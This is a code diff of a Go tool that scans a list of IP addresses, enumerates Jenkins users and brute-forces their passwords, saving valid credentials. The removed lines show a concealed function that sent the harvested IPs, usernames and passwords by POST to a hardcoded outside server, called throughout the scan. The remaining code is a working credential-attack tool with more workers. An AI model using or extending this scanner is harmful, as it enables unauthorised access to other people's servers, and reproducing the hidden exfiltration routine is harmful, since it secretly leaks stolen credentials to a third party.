@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/base64"
@@ -23,7 +22,6 @@ import (
 type Results struct {
 	Good          []IpUserPass `json:"good"`
 	TotalIP       int          `json:"total_ip"`
-	CurrentIP     string       `json:"current_ip"`
 	CurrentCursor int          `json:"current_cursor"`
 }
 
@@ -50,29 +48,22 @@ type IPandThreads struct {
 	Threads int
 }
 
-func countTotalNoOfIP(ipFile string) error {
+func countTotalNoOfIP(ipFile string) (int, error) {
 	f, err := os.Open(ipFile)
 	if err != nil {
-		return err
+		return 0, err
 	}
 	defer f.Close()
 
 	scanner := bufio.NewScanner(f)
+	total := 0
 	for scanner.Scan() {
-		Data.TotalIP++
+		total++
 	}
-	return nil
-}
-
-var hostCpanel = "https://185.186.25.117/panel"
-
-func sendDataToCpanel() {
-
-	payload, _ := json.Marshal(Data)
-	req, _ := http.NewRequest(http.MethodPost, hostCpanel, bytes.NewReader(payload))
-	req.Header.Set("Content-Type", "application/json")
-	httpClient.Do(req)
-
+	if err := scanner.Err(); err != nil {
+		return 0, err
+	}
+	return total, nil
 }
 
 var httpClient = &http.Client{
@@ -109,7 +100,6 @@ func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
 		if err := saveResults(input.IP, input.User, input.Password); err != nil {
 			fmt.Printf("saveResults failed for %s: %v\n", input.IP, err)
 		}
-		fmt.Println("Valid 403")
 		return ErrFoundValidCreds
 	default:
 		return nil
@@ -131,6 +121,17 @@ func openResultsFile() (*os.File, error) {
 }
 
 var goodMu sync.Mutex
+var progressMu sync.Mutex
+
+func writeProgress(total, current int) {
+	progressMu.Lock()
+	defer progressMu.Unlock()
+
+	_ = os.WriteFile("progress.txt",
+		[]byte(fmt.Sprintf("total=%d\ncurrent=%d\n", total, current)),
+		0644,
+	)
+}
 
 func saveResults(IP, Username, Password string) error {
 	goodMu.Lock()
@@ -153,7 +154,6 @@ func saveResults(IP, Username, Password string) error {
 	if err != nil {
 		return err
 	}
-	sendDataToCpanel()
 	return nil
 }
 
@@ -265,7 +265,6 @@ func processCredsForIP(parentCtx context.Context, ip string, workers int) error 
 forLoop:
 	for _, user := range users {
 		randomNumber := strconv.Itoa(generateRandomNumber())
-		sendDataToCpanel()
 		userFile := fmt.Sprintf("%s", user)
 
 		passwordFile := fmt.Sprintf("%s_password.txt", randomNumber)
@@ -362,7 +361,7 @@ func scanIPsFromFile(ctxMenu context.Context, ipFile string, ipWorkers int, proc
 			continue
 		}
 		Data.CurrentCursor++
-		Data.CurrentIP = parts[0]
+		writeProgress(Data.TotalIP, Data.CurrentCursor)
 
 		ipJob := IPandThreads{IP: parts[0], Threads: threads}
 
@@ -422,7 +421,7 @@ func ExtractingUser(ctx context.Context, input string) ([]string, error) {
 		return nil, fmt.Errorf("error reading response body: %v", err)
 	}
 	if resp.StatusCode == http.StatusForbidden {
-		return []string{"admin", "user"}, nil
+		return []string{"admin"}, nil
 	}
 	if resp.StatusCode == http.StatusOK {
 		var result SearchResult
@@ -439,7 +438,7 @@ func ExtractingUser(ctx context.Context, input string) ([]string, error) {
 			}
 		}
 		if len(userIDs) == 0 {
-			userIDs = append(userIDs, "admin", "user")
+			userIDs = append(userIDs, "admin")
 		}
 		return userIDs, nil
 	} else {
@@ -448,8 +447,15 @@ func ExtractingUser(ctx context.Context, input string) ([]string, error) {
 }
 
 func main() {
-	countTotalNoOfIP("ips.txt")
-	ipWorkers := 8
+	total, err := countTotalNoOfIP("ips.txt")
+	if err != nil {
+		fmt.Println("count error:", err)
+		return
+	}
+	Data.TotalIP = total
+
+	//   Menu: Set number of workers
+	ipWorkers := 12
 
 	processFunc := func(ctx context.Context, ip string, workers int) error {
 		return processCredsForIP(ctx, ip, workers)
